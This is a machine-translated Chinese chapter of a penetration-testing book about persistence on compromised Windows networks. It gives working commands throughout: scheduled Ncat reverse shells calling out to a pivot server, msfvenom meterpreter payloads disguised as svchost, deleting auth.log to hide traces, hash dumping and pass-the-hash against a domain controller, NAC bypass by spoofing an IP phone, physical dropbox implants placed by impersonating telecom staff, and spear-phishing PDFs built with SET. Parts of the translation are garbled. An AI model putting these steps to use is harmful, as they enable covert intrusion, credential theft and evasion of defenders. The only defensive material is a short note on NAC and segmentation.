# 第 8 章维护远程访问

有没有想过黑客们是如何进入一个安全的网络，在网络中呆上几个月甚至几年而不被抓获的？好吧，这些是你呆在里面的一些大技巧。我们不仅要讨论如何维护对您拥有的本地计算机的访问，还要讨论如何在网络中使用 Dropbox，并让它打电话回家。

在本章中，我们将介绍以下主题：

*   在受损的 Windows 服务器上使用 Netcat
*   将共享文件夹放入受损服务器
*   使用 Metasploit 设置恶意软件代理
*   使用 Dropbox 跟踪网络
*   用两个简单的步骤击败 NAC
*   使用社会工程工具包创建鱼叉式网络钓鱼电子邮件

# 维护接入

**持续连接**在黑客世界中被称为*打电话回家*。持久性使攻击者能够保持与攻击机器的连接，并且具有与受害者机器的完整命令行或桌面连接。

为什么要这样做？您的网络通常由防火墙保护，与内部计算机的端口连接由防火墙控制，而不是由本地计算机控制。当然，如果你在一个盒子里，你可以打开 telnet，你可以从本地网络访问 telnet 端口。您不太可能从公共网络访问此端口。任何本地防火墙都可能会阻止此端口，网络扫描将显示 telnet 正在受害计算机上运行。这将提醒目标组织的网络安全团队。因此，与其使用端口来调用受损服务器，不如让您的受害者机器向您的攻击机器发出呼叫，这样更安全、更有效。

在本章中，我们将主要使用 HTTPS 反向 shell。这样做的原因是，您可以让您的受损机器调用攻击机器上的任何端口，但如果将此连接发送到不寻常的目的地，例如攻击机器上的端口`4444`，一个好的 IDS/IPS 系统可以拾取此连接。大多数 IDS/IPS 系统都会将到 HTTPS 端口的出站连接列为白名单，因为大多数系统的系统更新都是通过 HTTPS 协议进行的。您与攻击机器的出站连接看起来更像是更新或常规用户互联网浏览，而不是出站黑客端口。

持久连接必须直接返回到攻击者的计算机。您可以从一台或多台机器上旋转这种类型的连接，以覆盖您的轨迹。在目标网络内旋转一台机器，在目标网络外旋转两台机器，使防守队员更难看到发生了什么。

是的，在朝鲜或中国，你可以从机器上转移这种类型的攻击，看起来攻击来自那里。每当我们在媒体上听到某个卑鄙的外国攻击者发起“网络攻击”时，我们都会翻白眼。除非您可以访问攻击机器及其日志，否则无法确定攻击的原始来源。即使能够访问这台攻击机器，您仍然不知道攻击者为进入这台机器做了多少次旋转。如果没有上一次连接的完整跟踪，您仍然不知道。在这个过程中使用 Tor 之类的东西，任何人都无法确切地知道黑客来自何处。

在这个演示中，我们将从一个四向支点出发，通过四个不同的国家进行攻击，向您展示如何做到这一点。是的，我们这样做是真的！

### 注

*不要*攻击我们将在本书中使用的公共 IP 地址。这些是我们个人为这个项目租用的服务器。到本书印刷时，它们将不再受我们的控制。

持续连接的一个问题是它们可以被看到。我们永远不能低估一个偏执狂系统管理员的谨慎眼光（*“为什么服务器 192.168.202.4 与中国 IP 地址的 HTTP 连接持续了 4 天？”*）。真正的攻击者会使用这种方法来掩盖自己的行踪，以防被抓到，并检查攻击服务器是否有入侵者的证据。在您退出每台机器之后，很好地清除日志，并且追踪连接几乎是不可能的。在攻击者眼中，第一个与之建立持久连接的框将被视为恶意框，并且在每次连接后，攻击者将删除连接到此计算机的痕迹。

请注意，在下图中，受害者机器有一个内部地址。由于受害者机器正在呼叫，我们绕过了 NAT 的入站保护和入站防火墙规则。受害者机器将呼叫新加坡的服务器。攻击者正在与美国的受损机器进行交互，但在登录到新加坡的邪恶服务器之前，正在通过两个跳跃进行旋转。我们在这个演示中只使用了四个跃点，但是您可以使用任意多的跃点。跳得越多，后面的轨迹就越混乱。一个好的攻击者在下一次进入时也会混淆跳跃，改变他的路由和入站连接的 IP 地址：

![Maintaining access](../Images/image00926.jpeg)

第一跳我们要去**阿姆斯特丹 178.62.241.119**！如果我们运行`whois`可以看到以下内容：

```
whois 178.62.241.119

inetnum:    178.62.128.0 - 178.62.255.255
netname:    DIGITALOCEAN-AMS-5
descr:     DigitalOcean Amsterdam
country:    NL
admin-c:    BU332-RIPE
tech-c:     BU332-RIPE
status:     ASSIGNED PA
mnt-by:     digitalocean
mnt-lower:   digitalocean
mnt-routes:   digitalocean
created:    2014-05-01T16:43:59Z
last-modified: 2014-05-01T16:43:59Z
source:     RIPE # Filtered

```

### 提示

**黑客提示**

一个好的调查员，看到这些信息，就会传唤 DigitalOcean，在受害者给家里打电话时，找出谁租用了这个 IP，但它很可能是列宁格勒一位小老太太的机器。僵尸网络的基础设施是从一组受损的盒子中开发出来的。本章介绍一个小型自己动手的僵尸网络。

现在我们来关注一下德国法兰克福**的主持人 46.101.191.216**。同样，如果我们运行`whois`，我们可以看到以下内容：

```
whois 46.101.191.216

inetnum:    46.101.128.0 - 46.101.255.255
netname:    EU-DIGITALOCEAN-DE1
descr:     Digital Ocean, Inc.
country:    DE
org:      ORG-DOI2-RIPE
admin-c:    BU332-RIPE
tech-c:     BU332-RIPE
status:     ASSIGNED PA
mnt-by:     digitalocean
mnt-lower:   digitalocean
mnt-routes:   digitalocean
mnt-domains:  digitalocean
created:    2015-06-03T01:15:35Z
last-modified: 2015-06-03T01:15:35Z
source:     RIPE # Filtered

```

现在转到**新加坡 128.199.190.69**的 pivot 主机，做一个`whois`：

```
whois 128.199.190.69

inetnum:    128.199.0.0 - 128.199.255.255
netname:    DOPI1
descr:     DigitalOcean Cloud
country:    SG
admin-c:    BU332-RIPE
tech-c:     BU332-RIPE
status:     LEGACY
mnt-by:     digitalocean
mnt-domains:  digitalocean
mnt-routes:   digitalocean
created:    2004-07-20T10:29:14Z
last-modified: 2015-05-05T01:52:51Z
source:     RIPE # Filtered
org:      ORG-DOI2-RIPE

```

我们现在准备从新加坡攻击。我们离目标机器只有几英里远，但对于毫无戒心的 IT 系统安全管理员来说，攻击似乎来自半个世界之外。

## 掩盖我们的足迹

如果我们有 root 或 sudo 访问这些机器的权限，我们可以通过运行以下命令彻底退出。这将删除我们登录的痕迹。由于这是我们的攻击机器，我们将以 root 用户身份运行。包含 SSH 服务的登录信息的文件是`/var/log/auth.log`。如果我们删除它，然后创建一个新文件，那么我们登录的日志现在就不存在了：

1.  进入`/var/log`目录：

    ```
    cd /var/log

    ```

2.  删除`auth.log`文件：

    ```
    rm auth.log

    ```

3.  新建空文件：

    ```
    touch auth.log

    ```

4.  丢弃终端会话：

    ```
    exit

    ```

现在从服务器上退出，你就完蛋了。如果您在退出连接时在每台机器上执行此操作，则无法找到您。因为这都是基于文本的，所以当通过这么多的轴运行命令时，您不会注意到任何延迟。而且，所有这些流量都是通过 SSH 加密的，所以没有人能看到你在做什么或你要去哪里。

# 与 Ncat 保持联系

**NetCat**（**Ncat**）是一个鲜为人知但功能强大的工具，旨在与网络端口进行原始套接字连接。它是一个小型工具，设计用于从一个可执行文件运行，该文件可以轻松地传输到系统，也可以重命名为任何名称，以隐藏操作系统中的可执行文件。Ncat 将回调仅具有用户级访问权限的攻击服务器。Ncat 是 unsecure.org 为您提供的一个开源应用程序，也是维护 NMap 的优秀人员。Ncat 和它的堂兄 nc 都安装在 Kali 上。Ncat 与 NMap 的任何安装捆绑在一起。

实际上，如前所述，Ncat 有两个版本。旧版本的可执行文件是 nc。Nc 还将与任何 TCP/UDP 端口建立原始套接字连接：

![Maintaining access with Ncat](../Images/image00927.jpeg)

Ncat 的最大优势在于它支持 SSL 加密，其中 nc 的所有流量都是明文。Nc 的流量有时可以通过 ID/IP 和其他安全设备获取。Ncat 的流量可以加密和隐藏，看起来像 HTTPS 流。Ncat 还能够仅允许来自特定 IP 地址或 IP 子网的连接。

破坏机器的最初攻击可能是网络攻击，也可能是使用某种社会工程方法，例如携带有效负载的 Phearfishing 电子邮件连接回攻击服务器。

下图是您想要拒绝的报价的 PDF 格式。此 PDF 包含相同的 phone home 负载，旨在安装恶意软件负载，而无需用户进行任何交互或批准。此 PDF 是在一个漂亮的工具中创建的，我们将在下一节*中介绍如何使用社会工程工具包*创建一个网络后门：

![Maintaining access with Ncat](../Images/image00928.jpeg)

一旦最初的攻击破坏了系统，我们希望系统定期呼叫总部。这样的漏洞可以设置为保持恒定连接，每次连接丢失时都会重置连接。也可以将其设置为按指定的间隔重新连接。我们喜欢将这些设置为在某个时间利用漏洞呼叫总部，如果攻击机器上没有可连接的端口，那么在该时间再次到来之前，利用漏洞将保持沉默。完全持久的连接可以引起网络安全的注意。

我们现在已连接到受害者机器，并将 Ncat 的模糊副本上载到受害者。从会话中我们可以看出，这是一次内部攻击。`ncat.exe`文件位于 Kali 上的`/usr/share/ncat-w32/`目录中。连接后，在 MeterMeter 中运行以下命令：

```
upload /usr/share/ncat-w32/ncat.exe C:/windows/ncat.exe

```

![Maintaining access with Ncat](../Images/image00929.jpeg)

这将 Ncat 可执行文件传输到受害者系统。注意，我们对目录斜杠使用的是`/`而不是`\`。因为您在 Linux 上，所以必须使用正斜杠。如果您使用`\`并运行该命令，您将发现目录名将一起运行，并且文件将无法正确上载。

转到 Windows 7 受害者，我们可以看到`Windows`目录中的文件：

![Maintaining access with Ncat](../Images/image00930.jpeg)

Windows NT 3.14 之后的 Windows 有一个命令行工具来运行计划任务。此工具称为`AT`命令。此命令与 Linux 或 UNIX 上可用的`cron`命令非常相似，与`cron`命令一样，您需要管理员级别的访问权限才能运行`AT`。您还可以运行`schtasks`命令，无论您的用户权限如何，该命令都将运行。您可以设置运行任何命令行工具或脚本的时间、日期和次数。因此，使用与机器的流量计连接将外壳插入系统：

```
shell

```

您现在处于受害者系统中，应键入以下内容：

```
AT 5:00PM ncat.exe -nv 128.199.190.69 443 –ssl -e cmd.exe

```

![Maintaining access with Ncat](../Images/image00931.jpeg)

这将设置作业在每天下午 5:00 运行。它将使用以下变量运行`ncat.exe`可执行文件。正在调用端口`443`上的攻击服务器`128.199.190.69`。`–ssl`标志告诉连接使用 SSL。`-e cmd.exe`标志告诉可执行文件通过连接运行`cmd.exe`可执行文件。

在下午 5:00 之前，我们使用各种枢轴登录到我们的邪恶服务器，以监听模式启动 Ncat，等待下午 5:00 到来。

注意，我们在这里连接到`//rogue3`并运行命令：

```
ncat -nvlp 443 –ssl

```

`-n`标志告诉系统不要使用 DNS。`-v`告诉系统将输出设置为详细，以便您可以看到输入和输出。`-l`让 Ncat 听。`-p`告知 Ncat 监听端口`443`，而`–ssl`告知 Ncat 使用 SSL 加密会话：

![Maintaining access with Ncat](../Images/image00932.jpeg)

现在，我们已通过完全管理员权限连接到被黑客攻击的 Windows 7 计算机，该漏洞将在每天下午 5:00 使用，而不会对网络进行任何进一步的攻击。

### 提示

**警告！**

真正的攻击者会将 Ncat 的名称更改为文件系统中更模糊、更难以识别的名称。小心两个`calc.exe`或 `notepad.exe`生活在你的系统中。一个在一个陌生的地方很可能是 Ncat 或其他类型的开发，就像我们将要建立的下一个。

## 用 Metasploit 打电话回家

嗯，那是老式的方法。现在，让我们使用 Metasploit 的工具做同样的事情。我们将在我们邪恶的服务器`//rogue3`上加载 Metasploit，让我们的受害者机器连接到该机器上的仪表外壳。我们将从早期的内部黑客中构建并上传此漏洞。除了**msfconsole**之外，我们还将使用 Metasploit 工具包中的其他一些工具。Metasploit 附带一个独立的应用程序，用于构建自定义漏洞利用和外壳代码。此工具名为**msfvenom**，我们将使用它构建一个漏洞。完全使用 msfvenom 本身可以填满一整章，超出了本书的范围；因此，在这里，我们将构建一个反向 http 攻击，使用最常见的标志生成可执行文件。我们将通过运行以下命令来构建该漏洞：

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_https -f exe -o svchost13.exe

```

**Msfvenom**是一款功能强大且可配置的工具。它有能力建立自定义漏洞攻击，将绕过任何反病毒软件。反病毒软件的工作原理是查看文件的签名。Msfvenom 能够以防病毒软件无法检测到的方式对漏洞进行编码。这是一种将漏洞隐藏为另一个常见可执行文件（如记事本）的情况。Msfvenom 可以向可执行文件添加 NOPs 或 null 代码，使其与原始文件大小相同。很可怕，不是吗？

旗帜列表如下：

<colgroup><col> <col> <col></colgroup> 
| 

用法：/opt/metasploit/apps/pro/msf3/msfvenom[选项]``

 |   |   |
| --- | --- | --- |
| **选项：** | **多头期权** | **变量** |
| `-p` | `--payload` | `<payload>` |
| `-l` | `--list` | `[module_type]` |
| `-n` | `--nopsled` | `<length>` |
| `-f` | `--format` | `<format>` |
| `-e` | `--encoder` |   |
| `-a` | `--arch` | `<architecture>` |
|   | `--platform` | `<platform>` |
| `-s` | `--space` | `<length>` |
| `-b` | `--bad-chars` | `<list>` |
| `-i` | `--iterations` | `<count>` |
| `-c` | `--add-code` | `<path>` |
| `-x` | `--template` | `<path>` |
| `-k` | `--keep` |   |
| `-o` | `--options` |   |
| `-h` | `--help` |   |
|   | `--help-formats` |   |

下面的图像显示了命令的输出。Msfvenom 显示没有使用编码器，并且没有检查构建中实现的坏字符。对于本演示，不需要它们：

现在，通过运行`ls`命令，我们可以看到我们的文件：

![Phoning Home with Metasploit](../Images/image00933.jpeg)

现在我们有东西要上传。就像 Ncat 示例一样，我们将使用系统的内部妥协上传我们的漏洞：

![Phoning Home with Metasploit](../Images/image00934.jpeg)

与 Ncat 一样，我们将进入受害者机器并设置`AT`命令以运行`svchost13.exe`：

```
shell
AT 5:25PM c:\windows\svchost.exe
exit
Just before 5:25 PM, log into the evil server //rogue3\. Fire up the Metasploit service msfconsole to get your listener set up and running to accept the connection. Then, set up the common handler module using the following commands.
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 128.199.190.69
set LPORT 443
exploit

```

运行该漏洞攻击后，处理程序将开始监听端口`443`上的连接，等待无助的受害者呼叫总部。等了一会儿，我们看到一个连接从`69.131.155.226`出现。这是我们的受害者机器后面的防火墙地址。然后，处理程序向系统提供一个命令提示符。运行 meterpeter 命令`sysinfo`，我们可以看到名称和机器信息。从这里你可以完全控制。

### 提示

真正的攻击者可能会利用此漏洞进行攻击，并且在数月内不会回来。问题的唯一迹象就是每天下午 5:25 一个连接断开并出现故障。只是网络上的一个小插曲。

![Phoning Home with Metasploit](../Images/image00935.jpeg)

你可能会对下一次征服感到兴奋，但由于我们在网络防火墙后面的机器上，让我们看看网络的其余部分。通过运行`ipconfig`，我们看到这台机器上有两个网络接口：一个在`10-network`上，在`10.100.0.0/24`上，另一个在`192.168.202.0`的`192.168-network`上。这些都是受保护的网络，但重要的是网络不是平坦的。您不能在专用范围内的两个不同网络类之间路由数据包。`10-network`可以接入互联网，因此它可能是一个 DMZ，而且上面的机器可能更坚固，并且包含的数据价值更低。这可能意味着另一个网络上的数据中有一些宝藏。这种类型的枢轴可以连接到任何一个网络，但让我们在这里攻击后端网络：

![Phoning Home with Metasploit](../Images/image00936.jpeg)

红色标记的路径是我们将从持久连接中获取的枢轴路径，用于攻击后端网络上的域控制器。

一天中的这个时候到了，我们在邪恶的服务器上启动了我们的侦听器，受害者的机器打电话回家。我们准备更进一步。我们将使用`meterpreter`命令`autoroute`获取进入`192.168.202.0/24`网络的路由。

这次当我们设置处理程序时，我们将在运行剥削命令时使用`-j`标志将会话发送到后台：

![Phoning Home with Metasploit](../Images/image00937.jpeg)

然后受害者的机器呼叫进来。这告诉我们目标网络中的防火墙没有被调整为阻止出站包流，并且异常行为没有向他们的**入侵检测系统**（**IDS**发出警报。我们有一个联系：

![Phoning Home with Metasploit](../Images/image00938.jpeg)

我们在受害者机器内，所以我们可以运行 DOS 命令。如果我们运行`ipconfig`，我们会看到两个接口及其地址：

![Phoning Home with Metasploit](../Images/image00939.jpeg)

正如我们所知，系统管理员经常在他们的网络中重复使用密码，所以让我们从这台机器上获取哈希值，并在 DC 上进行尝试。将这些哈希保存到文本文件或 Keepnote。稍后您将需要它们：

```
getsystem
hashdump

```

注意，hashdump 命令也找到了并下载了 Bo Weaver 的密码提示。暗示是“有趣的”。这可能会使您更容易猜测密码。有些人几乎用密码暗示自己的密码，比如“突袭者之星 Qback 1970”。只要稍加研究，你就会知道这位四分卫是乔治·布兰达，他 43 岁，那是突袭者队在 NFL 的第一个赛季。他的球衣号码是 16。您的密码列表需要包括“GeorgeBlanda16”、“Blanda1970”和其他相关内容：

![Phoning Home with Metasploit](../Images/image00940.jpeg)

键入以下内容：

```
run autoroute -s 192.168.202.0/24

```

然后运行以下命令打印出路线：

```
run autoroute -p

```

我们看到我们有一条进入后端网络的路线：

![Phoning Home with Metasploit](../Images/image00941.jpeg)

现在你有了一条路线，是时候侦察了。为了降低噪音，我们将在 Metasploit 中使用一个简单的端口扫描仪：

1.  Back out of our meterpreter by typing the following:

    ```
    background

    ```

    这将保持会话在后台打开和运行。

2.  设置扫描仪：

    ```
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 192.168.202.0/24
    set PORTS 139,445,389

    ```

3.  我们已设置端口`389`以查找域控制器。

    *   设置活动线程数：

        ```
         set THREADS 20

        ```

    *   运行扫描仪：

        ```
         run

        ```

扫描器运行并且我们看到一个 Windows 域控制器。这是我们的新目标：

![Phoning Home with Metasploit](../Images/image00942.jpeg)

我们现在有了目标和密码哈希，所以下一步是上传一个漏洞。由于我们有登录凭证，我们将使用`psexec`模块连接到域控制器：

![Phoning Home with Metasploit](../Images/image00943.jpeg)

我们没有使用明文密码，因为我们从 Win7 机器的管理员帐户捕获了哈希。因为我们有散列，所以不必强制输入密码。不同类别机器的密码可能总是不同的，但在这种情况下，它们是相同的。

### 提示

**传递哈希值**

散列与 Metasploit 中的密码一样有效。这就是所谓的对散列进行分类。通过散列攻击已经存在至少十年了，它们使用网络上可用的 Windows 登录会话信息。该漏洞利用**本地****安全机构**（**LSA**信息获取登录网络上机器的用户的 NTLM 哈希列表。用于获取信息的工具，如 Metasploit 框架或 Pass The Hash Toolkit，可以获取用户名、域名以及 LM 和 NT 哈希。

一旦漏洞被利用，我们会得到一个 MeterMeter 外壳，通过运行`sysinfo`我们可以看到我们在域控制器中：

```
sysinfo

```

![Phoning Home with Metasploit](../Images/image00944.jpeg)

如前所述，WindowsActive Directory 将密码散列存储在 SAM 数据库中，因此我们可以使用`hashdump`转储域中的所有散列：

```
hashdump

```

![Phoning Home with Metasploit](../Images/image00945.jpeg)

我们现在从一个没有互联网接入的后端网络获得了入侵王国的所有密钥。如果您注意到，在 hashdump 中用户名后面的数字中，您可以看到管理员是用户 500。许多专家告诉 Windows 网络管理员更改管理员帐户的名称，这样就没有人知道哪些用户拥有哪些权限。显然，这是行不通的。即使使用用户名 negiblenebbish，只要 UID 为 500 就表明这是一个具有管理权限的用户。

如果我们将此会话置于后台并运行 sessions 命令，我们可以看到两个会话都从`//rogue3`邪恶服务器运行到我们的受损系统：

```
background
sessions -l

```

![Phoning Home with Metasploit](../Images/image00946.jpeg)

# 升降箱

**投递箱**，有时也称为跳转箱，是一种小型设备，可以隐藏在目标物理位置的某个地方。让设备进入该位置有时需要其他技能，如社会工程，甚至是一点破门而入，才能让设备进入该位置。Dropbox 也可以是由安全顾问公司发送的一个盒子，安装在网络上，用于从远程位置进行笔测试。

如今，小型、功能齐全的计算机既便宜又易于配置。市场上也有专门为这一用途设计的设备，可以直接开箱即用。Raspberry Pi 是板上的一台小型计算机，运行一个完整的 Linux 发行版，可以为这项工作进行配置。有两种用于此用途的设备是 Wi-Fi 菠萝和 Pwnie Express。Wi-Fi 菠萝是我们个人的最爱。它配有两个可单独配置的 Wi-Fi 接入点和一个 CAT5 接口。它只比一包香烟稍大一点。拥有两个 Wi-Fi 收音机和一个 CAT5 连接器，使该设备能够连接任何网络并从中旋转。

所以，现在你必须偷偷地把它放到网络上。对于有线网络来说，一种长期以来最受欢迎的入侵方式是友好的 telco guy 方法。在互联网上可以很容易地找到不同公司的员工徽章。制作徽章也是一个简单的过程。您可以在被动示意图阶段找出谁为您的目标提供电信服务。一旦你拿到了徽章，你就带着工具包和笔记本电脑出现在目标地点，到前台说“嗨，我来自电信提供商。我们收到了一张互联网运行缓慢的罚单。”你会惊讶地发现，这是多么容易进入门内并直接通向电话柜。进入电话柜后，您可以隐藏并连接预配置的 Dropbox。当它启动时，它给家里打电话，你就在里面了！

对于一种较少干扰的方法，如果你的目标在办公室有 Wi-Fi，你可以使用它作为你的攻击向量。这就是两台 Wi-Fi 收音机播放的地方。一个可用于攻击并连接到目标网络，另一个可用于连接到目标网络。菠萝公司的人甚至会卖给你一个电池，它可以使用 72 小时左右。有了这种安排，你的“邪恶包裹”甚至可以很容易地隐藏在灌木丛中，在没有交流电源的情况下运行。如果攻击期间无法进入该区域，并且您无法打电话给邪恶服务器，则捕获的数据也可以复制到设备上的闪存卡中。

当你对一个地点进行物理侦察时，寻找建筑物外的电缆。有时，当在某个位置进行扩展时，运行电缆的人员会在建筑物的外部运行一个下降点，以使安装更容易，但正如我们所看到的，这会打开一扇门，让人受到攻击。有了一个很好的藏身之处、两个 RJ45 连接器和一个便宜的交换机，你就可以接入有线网络。

# 破解 NAC（网络接入控制器）

如今，**网络访问控制器**（**NAC**设备在网络上变得越来越普遍。NAC 确实提供了更高级别的安全性，但它们并不是供应商的营销和销售材料所表明的“最终解决方案”。我们将向您展示一种绕过公司网络上 NAC 控制的简单方法。

下面的信息来自我们不久前对一家真正的公司进行的真正的黑客攻击。当然，为了保护公司，所有的名称和 IP 地址都已更改。这不是理论。这是一个真实的黑客世界。这部电视剧的好处在于，我们都是好人。可悲的是，只花了大约 30 分钟就解决了这个问题，也许两个小时就完全实现了。

对于 widgetmakers.com 公司，我们将绕过 NAC。Widget 制造商有两个网络：一个是公司局域网（CorpNET），另一个是生产网络（ProdNET），包含机密数据。这两个网络是平面设计的，两个网络都可以相互完全访问。在 CorpNET 上配置并安装了 NAC 设备。员工现在必须在其机器上使用 NAC 代理连接到 CorpNET。小部件制造商使用 SIP 电话进行语音通信。这些电话不在单独的 VLAN 上。它们连接到 CorpNET VLAN 以便于使用。Widget 制造商在 CorpNET 上也有许多网络打印机。

NAC 设备使用安装在用户机器上的代理来登录和验证用户和机器的身份。这些设备可以配置为使用**远程身份验证拨入用户系统**（**RADIUS**）服务器或域控制器获取用户凭据。有时 NAC 设备使用证书对机器进行身份验证。在没有代理和登录的情况下试图欺骗内部机器的 MAC 地址通常会导致 MAC 地址被锁定在网络之外。

系统中的弱点是代理。大多数 NAC 系统是专有的，并与一家供应商绑定。一个供应商的代理不会与另一个供应商的代理合作，并且没有 NAC 控制的标准。大多数供应商只生产在 Windows 上运行的代理；因此，如果网络上有 Mac 或 Linux 工作站，则无法使用 NAC 控件将其连接到网络。

那么，对于没有运行 Windows 操作系统的手机、打印机和工作站，你会怎么做才能让它们在 NAC 控制下工作呢？您必须在 NAC 设置中白名单他们的 MAC 和 IP 地址。因此，通过将其中一个设备从网络上取下并欺骗其身份，您现在可以使用所欺骗设备的访问级别访问受限 VLAN。通常，在平面网络上，您可以访问所有本地网络中的所有内容。

黑客最容易的标志之一是 SIP 电话。如果打印机脱机，人们肯定会注意到。每个人都使用打印机。要使用打印机进行此类攻击，必须选择不经常使用的打印机。电话是另一种情况。办公室总是有多余的电话给客人，而且，如果你知道员工的工作日程，你可以为正在度假的人挑选一部电话。拔下他们的电话插头，将您的 Dropbox 贴在桌下，然后将其连接到电话分线盒，您将进入：

![Cracking the NAC (Network Access Controller)](../Images/image00947.jpeg)

那么，你如何避免这种情况？

首先，不要指望 NAC 是您网络上的终极安全功能。NAC 应该只是网络安全体系结构中的一层。实际上，它应该是网络安全的上层之一。一个简单的解决方法是关闭（拔下）未使用的网络端口。这不会使你免于黑客破坏度假者的桌面电话，但它可以防止一个空立方体成为黑客的总部。

任何网络安全的第一层都应该是适当的分割。如果你无法找到它，你就无法到达它。请注意，在上图中，CorpNET 和 ProdNET 可以完全访问对方；通过 CorpNET 欺骗网络设备进入的攻击者可以访问受限 ProdNET。

# 使用社会工程工具包创建鱼叉式网络钓鱼攻击

**社交****工程工具包**（**SET**）许可协议规定 SET 纯粹为善而非恶而设计。任何未经网络和设备所有者授权的恶意使用本工具的行为都违反了本工具集的**服务条款**（**TOS**和许可证。要查找此工具，请通过菜单**Kali Linux****剥削工具****社会工程工具包**，或在命令行上键入`setoolkit`：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00948.jpeg)

这将是一个 Metasploit 反向 HTTP 攻击，因此在使用 SET 之前，您必须执行几个步骤：

启动 Metasploit 服务。

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00949.jpeg)

在 Kali 1.x 中，这是两个步骤，但在 Kali 2.0 中，启动服务的前一个映像和打开 Metasploit Framework 控制台的下一个映像是一个命令：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00950.jpeg)

1.  通过菜单**应用程序****08**启动 Metasploit 控制台。**开发工具****元 Sploit 框架**。您还可以通过在命令提示符下键入`msfconsole`来启动 Metasploit Framework 控制台，完全避免使用 GUI 菜单。
2.  确定您的侦听器将要侦听的本地主机地址，以便您的恶意软件可以打电话回家。在我们的测试网络中，Kali 服务器运行在物理主机上的虚拟机上。恶意软件传入时，主机的 IP 或来自虚拟机的桥接伪以太网卡必须是目标。如果您在 Internet 上的 VMS 机器上运行您的 Kali，这将稍微不那么困难。
3.  以下是测试网络的配置。有两台可以访问 Internet 的机器和两台只能从内部网络访问的服务器。Kali 186 是攻击者的笔记本电脑，Windows 10 工作站是内部网络的跳转盒。
4.  Once you have started Metasploit, you need to start the listener, so the malware you are about to create has something to answer the call when it phones home.

    在 msf 命令提示符中键入以下命令：

    ```
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_https
    set LHOST 10.0.0.2
    set LPORT 4343
    exploit

    ```

侦听器是一个开放的运行进程，因此游标不会返回到就绪状态。为了证明侦听器处于活动状态，我们可以使用 NMap 对其运行端口扫描：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00951.jpeg)

在另一侧上，监听器通过读取扫描数据响应 NMap 扫描：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00952.jpeg)

从下图可以看出，扫描的来源是由监听器标记的，所有的扫描请求都被记录为来自**10.0.2.15**，这是 Kali 机器的内部 IP：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00953.jpeg)

我们将要创建的恶意软件将是一个包装在 PDF 文件中的可执行文件。这将是一封电子邮件的附件，该电子邮件来自据称安全的来源，发送给目标公司中已识别的系统管理员。我们将首先回顾 SET 的菜单结构。

主菜单有六个条目和一个退出提示：

1.  **社会工程攻击**
2.  **快速通道渗透测试**
3.  **第三方模块**
4.  **更新社会工程师工具包**
5.  **更新集配置**
6.  **帮助、积分和关于**
7.  **退出社会工程工具包**

在**社会工程****攻击**项下，共有十一个条目：

1.  **鱼叉式网络钓鱼攻击向量**
2.  **网站攻击向量**
3.  **感染性媒介发生器**
4.  **创建有效负载和侦听器**
5.  **群发邮件攻击**
6.  基于 ARDUIO 的攻击向量
7.  无线接入点攻击向量
8.  qr 码生成器攻击向量
9.  **Powershell 攻击向量**
10.  **第三方模块**
11.  **返回主菜单**

使用**鱼叉式网络钓鱼攻击****向量**，有四种选择：

1.  执行大规模电子邮件攻击
2.  创建文件格式负载
3.  创建一个社会工程模板
4.  返回主菜单

由于我们将设置一个持续的威胁，让我们能够控制受害者的机器，并且必须克服用户可能不愿双击附件的情况，因此我们必须创建一个不可抗拒的矛式钓鱼邮件。要做到这一点，重要的是要提前进行有效的侦察。

公司通讯簿和日历对于创建打开电子邮件所需的紧急状态非常有用。就像通过电子邮件进行营销一样，无论是合法的还是垃圾邮件，矛式网络钓鱼电子邮件的标题对受害者来说必须是有趣、有趣或可怕的：

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00954.jpeg)

这封电子邮件简短、有趣，而且贪婪会造成紧迫感。附件可以是以下任何一种：

*   一个 zip 文件，假定里面有一个文档
*   Word 文档
*   PDF 文件

社会工程工具包提供了 21 种可能的有效载荷。其中一些在 Macintosh 操作系统上比在 Windows 系统上工作得更好。大多数 Windows 工作站未设置为处理 RAR 压缩文件。这里的选择如下：

1.  设置自定义写的 DLL 劫持攻击向量（RAR，ZIP）
2.  设置自定义书面文档 UNC LM SMB 捕获攻击
3.  MS14-017 Microsoft Word RTF 对象混淆（2014-04-01）
4.  Microsoft Windows CreateSizedDIBSECTION 堆栈缓冲区溢出
5.  Microsoft Word RTF pFragments 堆栈缓冲区溢出（MS10-087）
6.  Adobe Flash Player“按钮”远程代码执行
7.  Adobe CoolType SING 表“uniqueName”溢出
8.  Adobe Flash Player“newfunction”指针使用无效
9.  Adobe Collab.collectEmailInfo 缓冲区溢出
10.  Adobe Collab.getIcon 缓冲区溢出
11.  Adobe JBIG2Decode 内存损坏攻击
12.  AdobePDF 嵌入式社会工程
13.  Adobe util.printf（）缓冲区溢出
14.  自定义 EXE 到 VBA（通过 RAR 发送）（需要 RAR）
15.  Adobe U3D CLODProgressiveMeshDeclaration 数组溢出
16.  Adobe PDF Embedded EXE 社会工程（NOJS）
17.  Foxit PDF 阅读器 v4.1.1 标题堆栈缓冲区溢出
18.  Apple QuickTime PICT PnSize 缓冲区溢出
19.  Nuance PDF Reader v6.0 启动堆栈缓冲区溢出
20.  Adobe Reader u3D 内存损坏漏洞
21.  MSCOMCTL ActiveX 缓冲区溢出（ms12-027）

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00955.jpeg)

让我们选择默认值，即第 12 项。当您点击*输入*时，下一个屏幕允许您使用自己设计的修改过的 PDF 文件，或使用内置的空白 PDF。选择第二个选项，我们将看到七个进一步的选项：

1.  Windows 反向 TCP 外壳
2.  Windows 流量计反向\u TCP
3.  Windows 反向 VNC DLL
4.  Windows 反向 TCP 外壳（x64）
5.  Windows 流量计反向\u TCP（X64）
6.  Windows Shell 绑定\u TCP（X64）
7.  Windows MeterMeter 反向 HTTPS

![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00956.jpeg)

